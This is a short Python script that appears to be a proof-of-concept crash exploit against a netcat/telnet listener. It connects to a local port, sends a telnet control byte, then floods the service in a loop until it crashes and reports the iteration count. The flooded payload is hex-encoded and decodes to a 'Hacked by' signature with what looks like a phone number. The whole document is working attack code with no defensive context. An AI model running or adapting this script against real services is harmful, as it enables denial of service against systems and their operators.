import socket

RHOST = "127.0.0.1"
RPORT = 5555

print("[+] Connecting to %s:%d") % (RHOST, RPORT)
s = socket.create_connection((RHOST, RPORT))
s.send("\xFF") # Telnet control character
print("[+] Telnet control character sent")
print("[i] Starting")
try:
	i = 0
	while True: # Loop until it crashes
		i += 1
		s.send("\x30\x30\x30\x20\x48\x61\x63\x6B\x65\x64\x20\x62\x79\x20\x41\x68\x6D\x65\x64\x20\x20\x2B\x32\x30\x31\x31\x35\x30\x31\x31\x39\x38\x39\x35\x20\x30\x30\x30")
except:
	print("[+] Netcat crashed on iteration: %d") % (i)